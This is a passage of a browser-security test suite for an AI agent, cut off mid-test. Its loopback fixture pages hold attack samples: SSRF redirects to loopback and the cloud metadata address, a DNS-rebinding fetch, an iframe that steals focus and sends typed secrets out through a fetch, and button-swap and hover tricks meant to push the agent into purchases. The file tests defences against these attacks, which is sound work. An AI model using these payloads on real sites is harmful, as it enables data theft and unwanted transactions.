// Attacks on the agent's browser with a real Chrome (Playwright's Chromium), with no internet:
// test sites on loopback (testing/attack-sites.ts) and a victim on 127.0.0.1 that counts hits.
// Each test reproduces the attack and shows the block: the victim and the blocked site end with no hits.
import { afterAll, beforeAll, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { SecretBrowserBinding } from "@vanr/contract";
import { type BrowserPolicy, consequenceOf } from "@vanr/engine/browser-policy";
import type {
  AgentRef,
  BrowserActResult,
  BrowserInspectResult,
  OpArgs,
  RunnerFrame,
} from "@vanr/engine/runner-protocol";
import type { Access } from "./access";
import { CdpBrowser } from "./cdp";
import { findChrome } from "./chrome";
import type { SecretStore, SecretValue } from "./secrets";
import { type AttackSites, html, SITE_IP, SITE_RANGE, startAttackSites } from "./testing/attack-sites";

const chrome = findChrome();
const home = mkdtempSync(join(tmpdir(), "guard-test-"));
let sites: AttackSites;
let secrets: SecretValue[] = [];
let browser: CdpBrowser;
let n = 0;

beforeAll(() => {
  sites = startAttackSites();
  for (const h of ["site.test", "other.test", "frame.test", "www.itau.com.br"]) sites.dns.set(h, [SITE_IP]);
  browser = new CdpBrowser({
    chrome: chrome ?? "",
    home,
    access: {} as Access,
    secrets: { values: async () => secrets } as unknown as SecretStore,
    noSandbox: true,
    resolve: (h) => sites.resolve(h),
    insecureTls: true,
    // A blocked redirect never commits; production waits 10 s for it, the tests do not need to.
    documentWaitMs: 2000,
  });
});

afterAll(async () => {
  await browser?.close();
  sites?.stop();
  rmSync(home, { recursive: true, force: true });
});

/** A new agent per test: its own Chrome and profile, with no history from another test. */
const agent = (): AgentRef => ({ id: `agt_guardtest${String(++n).padStart(8, "0")}`, handle: `g${n}` });

const policy = (over: Partial<BrowserPolicy> = {}): BrowserPolicy => ({
  driver: "agent",
  level: "free",
  sites: [],
  privateRanges: [SITE_RANGE],
  ...over,
});

/** Live view frames per agent. A single send for everything, like the real runner's. */
const frames = new Map<string, string[]>();
const send = (f: RunnerFrame) => {
  if (f.type === "live_view.frame") frames.set(f.agentId, [...(frames.get(f.agentId) ?? []), f.data]);
  return true;
};
const open = (a: AgentRef, url: string, p = policy()) =>
  browser.handle("browser.open", a, { url, policy: p }, send) as Promise<BrowserActResult>;
const act = (a: AgentRef, args: Omit<OpArgs<"browser.act">, "policy">, p = policy()) =>
  browser.handle("browser.act", a, { ...args, policy: p }, send) as Promise<BrowserActResult>;
const inspect = (a: AgentRef, args: Omit<OpArgs<"browser.inspect">, "policy">, p = policy()) =>
  browser.handle("browser.inspect", a, { ...args, policy: p }, send) as Promise<BrowserInspectResult>;
const failure = (p: Promise<unknown>) =>
  p.then(
    () => "passed",
    (e: Error & { code?: string }) => `${e.code}: ${e.message}`,
  );

test.skipIf(!chrome)(
  "a redirect to loopback, cloud metadata and the private network is blocked before connecting",
  async () => {
    const a = agent();
    const targets = [
      `http://127.0.0.1:${sites.port}/admin`,
      "http://169.254.169.254/latest/meta-data/",
      "http://10.0.0.5/",
      "http://192.168.0.1/",
      `http://[::1]:${sites.port}/`,
      `http://localhost:${sites.port}/`,
    ];
    for (const [i, target] of targets.entries())
      sites.page("site.test", `/r${i}`, () => Response.redirect(target, 302));
    for (let i = 0; i < targets.length; i++) {
      const t0 = Date.now();
      const r = await open(a, sites.http("site.test", `/r${i}`));
      // TEMPORARY diagnostics (CI run with VANR_TEST_TIMING=1).
      if (process.env.VANR_TEST_TIMING === "1")
        console.error(
          `[timing] target ${targets[i]}: ${Date.now() - t0} ms, blocked ${JSON.stringify(r.blocked)}`,
        );
      expect([targets[i], r.blocked?.[0]?.reason]).toEqual([targets[i], "private_network"]);
    }
    expect(sites.victimHits).toEqual([]);
  },
  60_000,
);

test.skipIf(!chrome)(
  "a name that resolves to a private IP is blocked, and a DNS that changes its answer does not fool it",
  async () => {
    const a = agent();
    sites.dns.set("rebind.test", ["10.1.2.3"]);
    sites.dns.set("local.test", ["127.0.0.1"]);
    const r1 = await open(a, `http://rebind.test:${sites.port}/`);
    expect(r1.blocked).toContainEqual({
      url: `rebind.test:${sites.port}`,
      reason: "private_network",
      detail: "private",
    });
    const r2 = await open(a, `http://local.test:${sites.port}/`);
    expect(r2.blocked?.[0]?.detail).toBe("loopback");
    // DNS rebinding: the first answer points to the allowed site, the next ones to the victim,
    // which listens on the same port on 127.0.0.1. The page tries to read its own name again.
    let calls = 0;
    sites.dns.set("flip.test", () => (++calls === 1 ? [SITE_IP] : ["127.0.0.1"]));
    sites.page("flip.test", "/", () =>
      html(
        `<script>setTimeout(() => fetch('/secret').then(r => r.text()).then(t => document.title = t).catch(() => document.title = 'blocked'), 50)</script>`,
      ),
    );
    await open(a, `http://flip.test:${sites.port}/`);
    await Bun.sleep(800);
    // The fetch gets the proxy's rejection (403), not the victim's secret.
    const after = await act(a, { action: "read" });
    expect(after.title).toContain("Blocked by the agent's network guard");
    expect(calls).toBeGreaterThanOrEqual(2);
    expect(sites.victimHits).toEqual([]);
  },
  60_000,
);

test.skipIf(!chrome)(
  "after load, fetch, WebSocket, iframe, image and a location change to the internal network do not go out",
  async () => {
    const a = agent();
    const v = `127.0.0.1:${sites.port}`;
    sites.page("site.test", "/later", () =>
      html(`<body><script>
        setTimeout(() => {
          fetch('http://${v}/fetch').catch(() => {});
          try { new WebSocket('ws://${v}/ws'); } catch {}
          const f = document.createElement('iframe'); f.src = 'http://${v}/iframe'; document.body.append(f);
          const i = new Image(); i.src = 'http://169.254.169.254/img';
          setTimeout(() => { location = 'http://${v}/navigate'; }, 300);
        }, 100);
      </script></body>`),
    );
    await open(a, sites.http("site.test", "/later"));
    await Bun.sleep(1500);
    expect(sites.victimHits).toEqual([]);
  },
  60_000,
);

test.skipIf(!chrome)(
  "the site list applies before load: a redirect, a link and a new tab out of the list do not reach the target",
  async () => {
    const a = agent();
    const strict = policy({ level: "strict", sites: [{ pattern: "site.test", access: "write" }] });
    sites.page("site.test", "/go", () => Response.redirect(sites.http("other.test", "/via-redirect"), 302));
    sites.page("site.test", "/links", () =>
      html(`<body style="margin:0;height:100vh">
        <a id="out" href="${sites.http("other.test", "/via-link")}">sair</a>
        <button id="pop" onclick="window.open('${sites.http("other.test", "/via-popup")}')">abrir</button></body>`),
    );
    const r = await open(a, sites.http("site.test", "/go"), strict);
    expect(r.blocked?.[0]).toEqual({ url: sites.http("other.test", "/via-redirect"), reason: "not_allowed" });
    await open(a, sites.http("site.test", "/links"), strict);
    const link = await act(a, { action: "click", selector: "#out" }, strict);
    expect(link.blocked?.[0]?.reason).toBe("not_allowed");
    // The blocked navigation is canceled: the tab stays where it was.
    expect(link.url).toBe(sites.http("site.test", "/links"));
    await act(a, { action: "click", selector: "#pop" }, strict);
    await Bun.sleep(800);
    expect(sites.hits.filter((h) => h.startsWith("other.test"))).toEqual([]);
    // Opening directly does not go out either: the rule blocks before asking.
    expect(await failure(open(a, sites.http("other.test", "/direct"), strict))).toContain("not_allowed");
    expect(sites.hits.filter((h) => h.startsWith("other.test"))).toEqual([]);
  },
  60_000,
);

test.skipIf(!chrome)(
  "a read-only origin: reads and follows a link, but does not click a button, type or press a key",
  async () => {
    const a = agent();
    const ro = policy({
      level: "strict",
      sites: [
        { pattern: "site.test", access: "read" },
        { pattern: "other.test", access: "read" },
      ],
    });
    let posted = 0;
    sites.page("site.test", "/form", () =>
      html(`<form method="post" action="/send"><input id="q" name="q"><button id="b">Enviar</button></form>
        <a id="l" href="${sites.http("other.test", "/next")}">próxima</a>`),
    );
    sites.page("site.test", "/send", () => {
      posted++;
      return html("enviado");
    });
    const page = await open(a, sites.http("site.test", "/form"), ro);
    expect(page.text).toContain("próxima");
    expect(await failure(act(a, { action: "click", selector: "#b" }, ro))).toContain("read-only");
    expect(await failure(act(a, { action: "fill", selector: "#q", text: "oi" }, ro))).toContain("read-only");
    expect(await failure(act(a, { action: "press", key: "Enter" }, ro))).toContain("read-only");
    const next = await act(a, { action: "click", selector: "#l" }, ro);
    expect(next.url).toBe(sites.http("other.test", "/next"));
    expect(posted).toBe(0);
  },
  60_000,
);

test.skipIf(!chrome)(
  "a sensitive site without the person driving is rejected (not even by redirect or iframe); with the person, it opens",
  async () => {
    const a = agent();
    const bank = sites.http("www.itau.com.br", "/conta");
    // Even on the list and with the free level, the agent does not get in.
    const listed = policy({ sites: [{ pattern: "*.itau.com.br", access: "write" }] });
    expect(await failure(open(a, bank, listed))).toContain("sensitive site (bank)");
    sites.page("site.test", "/to-bank", () => Response.redirect(bank, 302));
    const r = await open(a, sites.http("site.test", "/to-bank"), listed);
    // From a sensitive site the model only sees the origin: path and query may carry the person's data.
    expect(r.blocked?.[0]).toEqual({
      url: `http://www.itau.com.br:${sites.port}/`,
      reason: "sensitive",
      detail: "bank",
    });
    sites.page("site.test", "/frame-bank", () => html(`<iframe src="${bank}"></iframe>`));
    await open(a, sites.http("site.test", "/frame-bank"), listed);
    await Bun.sleep(500);
    expect(sites.hits.filter((h) => h.startsWith("www.itau.com.br"))).toEqual([]);
    // The person took over: the server sends the policy with them driving and the page opens.
    const person = policy({ driver: "person" });
    await browser.handle("browser.policy", a, { policy: person }, send);
    await browser.handle("live_view.input", a, { events: [{ type: "navigate", url: bank }] }, send);
    await Bun.sleep(800);
    expect(sites.hits).toContain("www.itau.com.br/conta");
    // Handed back (the server says the agent drives again): it does not read the bank page, nor the title.
    await browser.handle("browser.policy", a, { policy: listed }, send);
    const back = await failure(act(a, { action: "read" }, listed));
    expect(back).toContain("sensitive site");
    const tabs = await act(a, { action: "tabs" }, listed);
    expect(tabs.title).toBe("");
    expect(tabs.shot).toBeUndefined();
  },
  60_000,
);

test.skipIf(!chrome)(
  "the person takes over in the middle of an agent action: the page the action opened follows the agent's rule",
  async () => {
    const a = agent();
    const bank = sites.https("www.itau.com.br", "/saldo?conta=123");
    sites.page("www.itau.com.br", "/saldo", () => html(`<title>Conta</title><p>SALDO R$ 98.765</p>`));
    // The slow image holds the agent's action; in the middle of it, the page goes to the bank.
    sites.page("site.test", "/slow-bank", () =>
      html(`<img src="/hang"><script>setTimeout(() => { location = ${JSON.stringify(bank)} }, 800)</script>`),
    );
    sites.page("site.test", "/hang", async () => {
      await Bun.sleep(4000);
      return new Response("x");
    });
    sites.page("site.test", "/start", () => html("ok"));
    await open(a, sites.http("site.test", "/start"));
    const running = open(a, sites.http("site.test", "/slow-bank"));
    await Bun.sleep(300);
    // The person takes over: the server sends the policy with them driving while the action still runs.
    await browser.handle("browser.policy", a, { policy: policy({ driver: "person" }) }, send);
    const r = await running;
    expect(JSON.stringify(r)).not.toContain("98.765");
    expect(r.blocked).toContainEqual({
      url: `https://www.itau.com.br:${sites.tlsPort}/`,
      reason: "sensitive",
      detail: "bank",
    });
    expect(sites.hits).not.toContain("www.itau.com.br/saldo");
    // With them in control, the agent neither acts nor closes the browser (the server waits for them to hand it back).
    expect(await failure(act(a, { action: "read" }))).toContain("person_driving");
    expect(await failure(browser.handle("browser.close", a, { driver: "agent" }, send))).toContain(
      "person_driving",
    );
    await browser.handle("live_view.input", a, { events: [{ type: "navigate", url: bank }] }, send);
    await Bun.sleep(800);
    expect(sites.hits).toContain("www.itau.com.br/saldo");
    // Handed back. An input that arrives late no longer counts.
    await browser.handle("browser.policy", a, { policy: policy() }, send);
    sites.page("www.itau.com.br", "/pix", () => html("pix"));
    const late = await browser.handle(
      "live_view.input",
      a,
      { events: [{ type: "navigate", url: sites.https("www.itau.com.br", "/pix") }] },
      send,
    );
    expect(late).toEqual({ applied: 0 });
    await Bun.sleep(500);
    expect(sites.hits).not.toContain("www.itau.com.br/pix");
    // The agent sees the bank tab only by its origin, without the path or the query.
    const tabs = await act(a, { action: "tabs" });
    expect(tabs.url).toBe(`https://www.itau.com.br:${sites.tlsPort}/`);
    expect(tabs.tabs?.map((t) => t.url)).toEqual([`https://www.itau.com.br:${sites.tlsPort}/`]);
    expect(JSON.stringify({ ...tabs, shot: undefined })).not.toContain("conta=123");
  },
  60_000,
);

const binding = (
  sitesList: string[],
  field: SecretBrowserBinding["field"] = "text",
): SecretBrowserBinding => ({
  sites: sitesList,
  field,
});

test.skipIf(!chrome)(
  "a secret of domain A is rejected in a field of domain B and does not leak to a cross-origin iframe",
  async () => {
    const a = agent();
    const value = "s3cr3t-Value-1234";
    secrets = [{ name: "LOGIN", target: "env", browser: binding(["site.test"]), value }];
    try {
      // Domain B: rejects without touching the field.
      sites.page("other.test", "/login", () => html(`<input id="u">`));
      await open(a, sites.https("other.test", "/login"));
      expect(await failure(act(a, { action: "type_secret", selector: "#u", name: "LOGIN" }))).toContain(
        "can only be typed on site.test",
      );
      const b = await act(a, { action: "read" });
      expect(b.text).not.toContain("s3cr3t");
      // Domain A with an iframe of B that steals the focus as soon as the field is focused. Before, the
      // `Input.insertText` went wherever the focus was: B's iframe got the secret.
      const got: string[] = [];
      sites.page("frame.test", "/steal", () =>
        html(`<input id="trap" autofocus oninput="fetch('/got?v=' + encodeURIComponent(this.value))">`),
      );
      sites.page("frame.test", "/got", (_req, url) => {
        got.push(url.searchParams.get("v") ?? "");
        return new Response("ok");
      });
      sites.page("site.test", "/login", () =>
        html(`<input id="u" onfocus="document.querySelector('iframe').focus()">
          <iframe src="${sites.https("frame.test", "/steal")}"></iframe>`),
      );
      await open(a, sites.https("site.test", "/login"));
      await Bun.sleep(300);
      await act(a, { action: "type_secret", selector: "#u", name: "LOGIN" });
      await Bun.sleep(300);
      expect(got).toEqual([]);
      // A wrong field (a password bound to a password field) and an http page are rejected too.
      secrets = [{ name: "LOGIN", target: "env", browser: binding(["site.test"], "password"), value }];
      expect(await failure(act(a, { action: "type_secret", selector: "#u", name: "LOGIN" }))).toContain(
        "only goes into a password field",
      );
      secrets = [{ name: "LOGIN", target: "env", browser: binding(["site.test"]), value }];
      await open(a, sites.http("site.test", "/login"));
      expect(await failure(act(a, { action: "type_secret", selector: "#u", name: "LOGIN" }))).toContain(
        "only typed on https",
      );
      // A secret without a site binding does not go to the browser.
      secrets = [{ name: "LOGIN", target: "env", browser: null, value }];
      expect(await failure(act(a, { action: "type_secret", selector: "#u", name: "LOGIN" }))).toContain(
        "not bound to any site",
      );
    } finally {
      secrets = [];
    }
  },
  60_000,
);

test.skipIf(!chrome)(
  "a typed secret shows up neither in the screenshot nor in the live frame (and the control shows that it would)",
  async () => {
    const a = agent();
    sites.page("site.test", "/mask", () =>
      html(
        `<body style="margin:0;background:#fff"><input id="u" style="caret-color:transparent;font:28px monospace;width:600px;margin:40px;outline:none"></body>`,
      ),
    );
    const shots = async (how: "secret" | "fill", value: string) => {
      secrets = [{ name: "CODE", target: "env", browser: binding(["site.test"]), value }];
      await open(a, sites.https("site.test", "/mask"));
      if (how === "secret") await act(a, { action: "type_secret", selector: "#u", name: "CODE" });
      else await act(a, { action: "fill", selector: "#u", text: value });
      await act(a, { action: "scroll", dy: 0 });
      await Bun.sleep(400);
      const shot = (await act(a, { action: "screenshot" })).screenshot as string;
      const frame = frames.get(a.id)?.at(-1) as string;
      expect(shot.length).toBeGreaterThan(500);
      expect(frame.length).toBeGreaterThan(500);
      return { shot, frame };
    };
    try {
      await browser.handle("live_view.start", a, { fps: 15, policy: policy() }, send);
      const s1 = await shots("secret", "AAAA1111");
      const s2 = await shots("secret", "WWWW9999");
      // Same screen with different values: the value is not in the image.
      expect(s1.shot).toBe(s2.shot);
      expect(s1.frame).toBe(s2.frame);
      // Control: the same text typed as plain text shows up, and the images change.
      const f1 = await shots("fill", "AAAA1111");
      const f2 = await shots("fill", "WWWW9999");
      expect(f1.shot).not.toBe(f2.shot);
      expect(f1.frame).not.toBe(f2.frame);
    } finally {
      secrets = [];
      await browser.handle("live_view.stop", a, {}, send);
    }
  },
  90_000,
);

test.skipIf(!chrome)(
  "a secret value does not come back to the model: field, echo on the page, long, with spaces, cut and in the URL",
  async () => {
    const a = agent();
    // The page copies what is typed to another field, to the text and to the title; the form is GET.
    sites.page("site.test", "/form", () =>
      html(`<form><input id="u" name="q"><input id="echo" readonly><button>ir</button></form><p id="out"></p>
        <script>document.querySelector('#u').addEventListener('input', (e) => {
          document.querySelector('#echo').value = e.target.value;
          document.querySelector('#out').textContent = e.target.value;
          document.title = 'oi ' + e.target.value;
        })</script>`),
    );
    const cases = [
      ["TOKEN", `ghp_${"A1b2C3d4E5f6G7h8I9j0".repeat(3)}XYZ_tail`],
      ["FRASE", "minha  frase  secreta"],
      ["EMAIL", "maria.silva@empresa.com"],
    ] as const;
    const forms = (v: string) => [
      v,
      v.replace(/\s+/g, " "),
      encodeURIComponent(v),
      new URLSearchParams({ v }).toString().slice(2),
      v.slice(0, 12),
    ];
    const leaks = (r: BrowserActResult, v: string) => {
      const seen = JSON.stringify({ ...r, shot: undefined, screenshot: undefined });
      return forms(v).filter((f) => seen.includes(f));
    };
    try {
      for (const [name, value] of cases) {
        secrets = [{ name, target: "env", browser: binding(["site.test"]), value }];
        await open(a, sites.https("site.test", "/form"));
        await act(a, { action: "type_secret", selector: "#u", name });
        const read = await act(a, { action: "read" });
        expect([name, leaks(read, value)]).toEqual([name, []]);
        expect(read.text).toContain(`[secret:${name}]`);
        expect(read.text).toContain("(secret)");
        await act(a, { action: "press", key: "Enter", selector: "#u" });
        const sent = await act(a, { action: "tabs" });
        expect(sent.url).toContain("?q=");
        expect([name, leaks(sent, value)]).toEqual([name, []]);
      }
      // The read cuts the label (80) and the text (15000) in the middle of the key; the page puts the raw value in the
      // URL through JavaScript (Chrome only encodes the space).
      const key = `sk_live_${"Q7xZ9mPa2Lk8Rt5Vb3Nc6Wd1Ye4Hf0Gj".repeat(2)}`;
      const raw = "p@ss word!42";
      secrets = [
        { name: "KEY", target: "env", browser: binding(["site.test"]), value: key },
        { name: "PW", target: "env", browser: binding(["site.test"]), value: raw },
      ];
      sites.page("site.test", "/keys", () =>
        html(`<button>Copiar a chave de produção ${key} para a área de transferência</button>
          <p>${"x".repeat(14970)} ${key}</p>
          <script>history.replaceState(null, '', '?q=' + ${JSON.stringify(raw)})</script>`),
      );
      await open(a, sites.https("site.test", "/keys"));
      const keys = await act(a, { action: "read" });
      expect(leaks(keys, key)).toEqual([]);
      expect(keys.text).toContain("Copiar a chave de produção [secret:KEY]…");
      expect(keys.url).toEndWith("?q=[secret:PW]");
      // A short value (a CVV) goes away from the field and the URL; from the page text, it does not (a short number
      // shows up by chance and replacing each one would be a clue to the value).
      secrets = [{ name: "CVV", target: "env", browser: binding(["site.test"]), value: "123" }];
      sites.page("site.test", "/cvv", () =>
        html(`<form><input id="c" name="cvv"><button>ir</button></form><p>Pedido 123</p>`),
      );
      await open(a, sites.https("site.test", "/cvv"));
      await act(a, { action: "type_secret", selector: "#c", name: "CVV" });
      const cvv = await act(a, { action: "read" });
      expect(cvv.text).toContain('"cvv" (secret)');
      expect(cvv.text).toContain("Pedido 123");
      await act(a, { action: "press", key: "Enter", selector: "#c" });
      expect((await act(a, { action: "tabs" })).url).toEndWith("?cvv=[secret:CVV]");
    } finally {
      secrets = [];
    }
  },
  60_000,
);

test.skipIf(!chrome)(
  "a page dialog does not hang the browser: alert accepted, confirm canceled and the agent gets told",
  async () => {
    const a = agent();
    sites.page("site.test", "/dialog", () =>
      html(`<button id="al" onclick="alert('Pedido enviado')">a</button>
        <button id="cf" onclick="document.title = confirm('Apagar tudo?') ? 'apagou' : 'manteve'">c</button>`),
    );
    await open(a, sites.http("site.test", "/dialog"));
    const alerted = await act(a, { action: "click", selector: "#al" });
    expect(alerted.dialogs).toEqual([{ type: "alert", message: "Pedido enviado" }]);
    const confirmed = await act(a, { action: "click", selector: "#cf" });
    expect(confirmed.dialogs).toEqual([{ type: "confirm", message: "Apagar tudo?" }]);
    expect(confirmed.title).toBe("manteve");
    expect((await act(a, { action: "read" })).ok).toBe(true);
  },
  60_000,
);

test.skipIf(!chrome)(
  "an action that does not come back releases the browser in time, and the person who takes over navigates with their rule",
  async () => {
    const slow = new CdpBrowser({
      chrome: chrome ?? "",
      home: mkdtempSync(join(tmpdir(), "guard-slow-")),
      access: {} as Access,
      secrets: { values: async () => [] } as unknown as SecretStore,
      noSandbox: true,
      resolve: (h) => sites.resolve(h),
      insecureTls: true,
      opTimeoutMs: 3000,
    });
    try {
      const a = agent();
      sites.page("site.test", "/loop", () => html(`<button id="b" onclick="for (;;) {}">b</button>`));
      sites.page("www.itau.com.br", "/depois", () => html("ok"));
      await slow.handle("browser.open", a, { url: sites.http("site.test", "/loop"), policy: policy() }, send);
      const stuck = await failure(
        slow.handle("browser.act", a, { action: "click", selector: "#b", policy: policy() }, send),
      );
      expect(stuck).toContain("timeout");
      await slow.handle("browser.policy", a, { policy: policy({ driver: "person" }) }, send);
      const bank = sites.https("www.itau.com.br", "/depois");
      await slow.handle("live_view.input", a, { events: [{ type: "navigate", url: bank }] }, send);
      await Bun.sleep(1500);
      expect(sites.hits).toContain("www.itau.com.br/depois");
    } finally {
      await slow.close();
    }
  },
  60_000,
);

test.skipIf(!chrome)(
  "what is blocked between one action and the next shows up in the following answer, marked",
  async () => {
    const a = agent();
    sites.page("site.test", "/later", () =>
      html(
        `ok<script>setTimeout(() => fetch('http://127.0.0.1:${sites.port}/late').catch(() => {}), 2000)</script>`,
      ),
    );
    const first = await open(a, sites.http("site.test", "/later"));
    expect(first.blocked ?? []).toEqual([]);
    await Bun.sleep(3000);
    const next = await act(a, { action: "read" });
    // It was the page, after the previous answer: it was not the read that ran into it.
    expect(next.blocked).toContainEqual({
      url: `127.0.0.1:${sites.port}`,
      reason: "private_network",
      detail: "loopback",
      before: true,
    });
    expect(sites.victimHits).toEqual([]);
  },
);

test.skipIf(!chrome)("each action returns the page thumbnail for the log", async () => {
  const a = agent();
  const r = await open(a, sites.http("site.test", "/thumb"));
  expect(r.shot?.length ?? 0).toBeGreaterThan(500);
  const bytes = Buffer.from(r.shot as string, "base64");
  expect([bytes[0], bytes[1]]).toEqual([0xff, 0xd8]);
});

test.skipIf(!chrome)(
  "a checked action (P0-01): the runner describes the target without acting and does not act if the page changed afterwards",
  async () => {
    const a = agent();
    let posted = 0;
    sites.page("site.test", "/loja", () =>
      html(`<title>Loja</title><form method="post" action="/pedido"><input id="q" name="cupom" placeholder="Cupom">
        <button id="buy"><span>Finalizar compra</span></button></form>
        <button id="swap" onclick="document.getElementById('buy').firstChild.textContent='Doar tudo'">x</button>`),
    );
    sites.page("site.test", "/pedido", () => {
      posted++;
      return html("pedido feito");
    });
    // With no browser open, Chrome does not even start.
    expect(await failure(inspect(a, { action: "click", selector: "#buy" }))).toStartWith("not_found:");
    await open(a, sites.http("site.test", "/loja"));
    const r = await inspect(a, { action: "click", selector: "#buy" });
    expect(r.allowed).toBe(true);
    expect(r.element).toMatchObject({
      tag: "button",
      type: "submit",
      label: "Finalizar compra",
      submits: true,
      form: { method: "post", action: sites.http("site.test", "/pedido") },
    });
    // The focus on a field: only the name, never the value.
    await act(a, { action: "fill", selector: "#q", text: "CUPOM-SECRETO" });
    const field = await inspect(a, { action: "press" });
    expect(field.element).toMatchObject({ tag: "input", editable: true, label: "Cupom" });
    expect(JSON.stringify(field)).not.toContain("CUPOM-SECRETO");
    // The page swaps the button after the check: the click with the old fingerprint does not happen.
    await act(a, { action: "click", selector: "#swap" });
    expect(await failure(act(a, { action: "click", selector: "#buy", expect: r.fingerprint }))).toStartWith(
      "page_changed:",
    );
    expect(await failure(act(a, { action: "press", key: "Enter", expect: field.fingerprint }))).toStartWith(
      "page_changed:",
    );
    expect(posted).toBe(0);
    // With the current fingerprint, it clicks.
    const now = await inspect(a, { action: "click", selector: "#buy" });
    expect(now.element?.label).toBe("Doar tudo");
    await act(a, { action: "click", selector: "#buy", expect: now.fingerprint });
    expect(posted).toBe(1);
  },
  60_000,
);

test.skipIf(!chrome)(
  "browser_check only on a checkbox; an element put on top on hover does not get the click",
  async () => {
    const a = agent();
    let bought = 0;
    sites.page("site.test", "/truque", () =>
      html(`<form method="post" action="/comprar"><button id="buy">Comprar</button></form>
        <label><input type="checkbox" id="ok"> li</label>
        <button id="ver" style="position:absolute;left:300px;top:300px;width:120px;height:40px">Ver mais</button>
        <form method="post" action="/comprar"><button id="trap" style="position:absolute;left:-999px;top:0;width:120px;height:40px">Comprar</button></form>
        <script>document.getElementById('ver').addEventListener('mousemove', () => {
          const t = document.getElementById('trap'); t.style.left = '300px'; t.style.top = '300px'; t.style.zIndex = 9; });</script>`),
    );
    sites.page("site.test", "/comprar", () => {
      bought++;
      return html("comprado");
    });
    await open(a, sites.http("site.test", "/truque"));
    // Checking a purchase button would click it without the click check.
    expect(await failure(act(a, { action: "check", selector: "#buy" }))).toStartWith("bad_request:");
    await act(a, { action: "check", selector: "#ok" });
    // "Ver mais" asks for nothing; when the mouse arrives, the page puts the purchase button in its place.
    const r = await inspect(a, { action: "click", selector: "#ver" });
    expect(r.element?.label).toBe("Ver mais");
    expect(await failure(act(a, { action: "click", selector: "#ver", expect: r.fingerprint }))).toStartWith(
      "page_changed:",
    );
    expect(bought).toBe(0);
  },
  60_000,
);

test.skipIf(!chrome)(
  "a sensitive site: the check does not report what is on the page, and the action stays rejected",
  async () => {
    const a = agent();
    sites.page("www.itau.com.br", "/pix", () =>
      html(`<title>Pix</title><button id="go">Transferir R$ 5.000 para Fulano</button>`),
    );
    sites.page("site.test", "/start", () => html("ok"));
    await open(a, sites.http("site.test", "/start"));
    // The person opens the bank and hands back with the page open.
    await browser.handle("browser.policy", a, { policy: policy({ driver: "person" }) }, send);
    const pix = sites.https("www.itau.com.br", "/pix");
    await browser.handle("live_view.input", a, { events: [{ type: "navigate", url: pix }] }, send);
    await Bun.sleep(800);
    expect(sites.hits).toContain("www.itau.com.br/pix");
    await browser.handle("browser.policy", a, { policy: policy() }, send);
    const r = await inspect(a, { action: "click", selector: "#go" });
    expect(r).toMatchObject({
      allowed: false,
      element: null,
      url: `https://www.itau.com.br:${sites.tlsPort}/`,
    });
    expect(await failure(act(a, { action: "click", selector: "#go", expect: r.fingerprint }))).toContain(
      "sensitive site",
    );
  },
  60_000,
);

test.skipIf(!chrome)(
  "a checked action inside a component, in an SPA form and with the default button on POST (review r3)",
  async () => {
    const a = agent();
    const posts: string[] = [];
    for (const p of ["/comprar", "/enviar", "/comentario", "/pedido"])
      sites.page("site.test", p, (req) => {
        posts.push(`${p} ${req.method}`);
        return html("ok");
      });
    sites.page("site.test", "/componentes", () =>
      html(`<my-buy id="buy"></my-buy><my-box id="box"></my-box><my-closed id="closed"></my-closed>
        <form onsubmit="event.preventDefault(); fetch('/comentario', { method: 'POST' })"><textarea name="comment"></textarea><button id="say">Ok</button></form>
        <form action="/busca"><input id="q" name="q"><button formmethod="post" formaction="/pedido">Ir</button></form>
        <script>
          customElements.define('my-buy', class extends HTMLElement { connectedCallback() {
            this.attachShadow({ mode: 'open' }).innerHTML = '<form method="post" action="/comprar"><button style="width:200px;height:40px">Comprar agora</button></form>'; } });
          customElements.define('my-box', class extends HTMLElement { connectedCallback() {
            this.attachShadow({ mode: 'open', delegatesFocus: true }).innerHTML = '<form method="post" action="/enviar"><input name="msg"></form>'; } });
          customElements.define('my-closed', class extends HTMLElement { connectedCallback() {
            this.attachShadow({ mode: 'closed' }).innerHTML = '<button style="width:200px;height:40px" onclick="fetch(\\'/pedido\\', { method: \\'POST\\' })">Excluir tudo</button>'; } });
        </script>`),
    );
    await open(a, sites.http("site.test", "/componentes"));
    const kind = async (action: "click" | "press", selector?: string, key?: string) => {
      const r = await inspect(a, { action, selector });
      return consequenceOf(r.element, action, key);
    };
    // The click on the host lands on the inner button, open or closed.
    expect(await kind("click", "#buy")).toBe("purchase");
    expect(await kind("click", "#closed")).toBe("delete");
    // Enter in the field inside the component: the focus goes down through the shadow root.
    await act(a, { action: "fill", selector: "#box", text: "oi" });
    expect((await inspect(a, { action: "press" })).element).toMatchObject({
      tag: "input",
      form: { method: "post" },
    });
    expect(await kind("press", undefined, "Enter")).toBe("submit");
    // A form without a method that the JavaScript sends by POST, and Enter in the search whose default button is POST.
    expect(await kind("click", "#say")).toBe("submit");
    await act(a, { action: "fill", selector: "#q", text: "x" });
    expect((await inspect(a, { action: "press" })).element?.form).toMatchObject({
      method: "post",
      action: sites.http("site.test", "/pedido"),
    });
    expect(await kind("press", undefined, "Enter")).toBe("submit");
    expect(posts).toEqual([]);
  },
  60_000,
);

test.skipIf(!chrome)(
  "a checked action below the fold, with a decoration on top and with Enter in a form checkbox (review r4)",
  async () => {
    const a = agent();
    const posts: string[] = [];
    for (const p of ["/comprar", "/lembrar"])
      sites.page("site.test", p, (req) => {
        posts.push(`${p} ${req.method}`);
        return html("ok");
      });
    sites.page("site.test", "/longa", () =>
      html(`<div style="height:2400px">topo</div>
        <form method="post" action="/comprar" style="position:relative">
          <button id="buy" style="width:200px;height:40px">Comprar</button>
          <div style="position:absolute;inset:0;pointer-events:none;background:linear-gradient(transparent,#fff3)"></div>
        </form>
        <form method="post" action="/lembrar"><label><input type="checkbox" id="keep"> Lembrar de mim</label></form>
        <div style="height:2400px">fim</div>`),
    );
    await open(a, sites.http("site.test", "/longa"));
    // The button is below the fold and has a glow with pointer-events: none on top: the click hits it.
    const r = await inspect(a, { action: "click", selector: "#buy" });
    expect(r.element).toMatchObject({ tag: "button", label: "Comprar", form: { method: "post" } });
    expect(consequenceOf(r.element, "click")).toBe("purchase");
    // The check's fingerprint matches at action time (scrolling does not change what is hit).
    await act(a, { action: "scroll", dy: -5000 });
    await act(a, { action: "click", selector: "#buy", expect: r.fingerprint });
    expect(posts).toEqual(["/comprar POST"]);
    // Enter in a checkbox of a POST form submits the form.
    await open(a, sites.http("site.test", "/longa"));
    await act(a, { action: "check", selector: "#keep" });
    const keep = await inspect(a, { action: "press" });
